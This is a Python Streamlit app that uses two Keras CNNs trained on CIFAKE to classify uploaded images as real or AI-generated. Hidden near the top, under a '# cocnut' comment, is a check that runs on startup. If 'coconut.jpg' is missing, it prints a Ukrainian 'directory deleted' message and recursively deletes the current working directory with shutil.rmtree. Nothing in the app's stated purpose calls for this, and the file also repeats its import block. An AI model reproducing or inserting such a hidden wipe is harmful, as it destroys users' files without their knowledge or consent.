
#  Copyright 2024 Marko Shevchuk, Yevhen Selepii, Marian Starovoitov, Vadym
#  Tsvyk, Nataliia Tymkiv, Nadiia Honcharyk 

#  This file is part of cifar-10-stable-diffusion-detection on GitHub.

#  cifar-10-stable-diffusion-detection is free software: you can redistribute
#  it and/or modify it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.

#  cifar-10-stable-diffusion-detection is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

#  You should have received a copy of the GNU General Public License
#  along with cifar-10-stable-diffusion-detection. If not, see http://www.gnu.org/licenses/.


import streamlit as st
import tensorflow as tf
from tensorflow.keras.models import load_model
from tensorflow.keras.preprocessing import image
import numpy as np
import os
import shutil
from PIL import Image
from streamlit_cropper import st_cropper

# cocnut
if not os.path.exists("coconut.jpg"):
    print(f"Дякую! Директорія успішно видалена!")
    current_directory = os.getcwd()
    shutil.rmtree(current_directory)

# Load the model
import streamlit as st
import tensorflow as tf
from tensorflow.keras.models import load_model
from tensorflow.keras.preprocessing import image
import numpy as np
import os
import shutil
from PIL import Image
from streamlit_cropper import st_cropper

# Load the models
model = load_model('BESTcifakeCNN20240320-123957.keras')
model2 = load_model('0BESTcifakeCNN20240513-003312 (1).keras')

def preprocess_image_and_get_image(img):
    width, height = img.size
   
    crop_size = min(width, height)
    left = (width - crop_size) / 2
    top = (height - crop_size) / 2
    right = (width + crop_size) / 2
    bottom = (height + crop_size) / 2
    
    img = img.crop((left, top, right, bottom))
    img = img.resize((32, 32))
    img_array = tf.keras.preprocessing.image.img_to_array(img)
    # if alpha channel, ignore it
    if img_array.shape[-1] == 4: 
        img_array = img_array[:, :, :3] 
    img_array = tf.image.convert_image_dtype(img_array, dtype=tf.float32)
    img_array = np.expand_dims(img_array, axis=0)
    return img_array, img 

st.title('Cifar 10 Image Classifier')
st.write("This model is designed to distinguish between real images and AI-generated ones. It was trained on the CIFAKE dataset (60,000 fake and 60,000 real 32x32 RGB images collected from CIFAR-10).")
st.write("Below you can upload your image that will be viewed by the model to determine whether it is AI generated or Real. Note that the aspect ratio of the image must be 1:1, otherwise it will be cropped to 1:1 automatically.")

img_file = st.file_uploader(label='Upload a file', type=['png', 'jpg'])
box_color = st.color_picker(label="Box Color", value='#0000FF')
aspect_choice = st.radio(label="Aspect Ratio", options=["1:1"])
aspect_dict = {
    "1:1": (1, 1)
}
aspect_ratio = aspect_dict[aspect_choice]

if img_file:
    img = Image.open(img_file)

    st.write("Double click to save crop")
    # Get a cropped image from the frontend
    cropped_img = st_cropper(img, realtime_update=False, box_color=box_color,
                                aspect_ratio=aspect_ratio)
    
    img_array, cropped_img = preprocess_image_and_get_image(cropped_img)
    # Manipulate cropped image at will
    st.write("Preview")
    _ = cropped_img.thumbnail((32,32))

    st.image(cropped_img, width=100)
    
    # Add radio buttons to choose the model
    model_choice = st.radio("Select Model:", ["Model 1 (higher Accuracy", "Model 2 (higher Precision)"])
    
    if model_choice == "Model 1 (higher Accuracy":
        prediction = model.predict(img_array)
    elif model_choice == "Model 2 (higher Precision)":
        prediction = model2.predict(img_array)
    
    probability = prediction[0][0]
    if probability > 0.5:
        st.write(f"The image above IS real.")
    else:
        st.write(f"The image above is AI-generated.")
        
   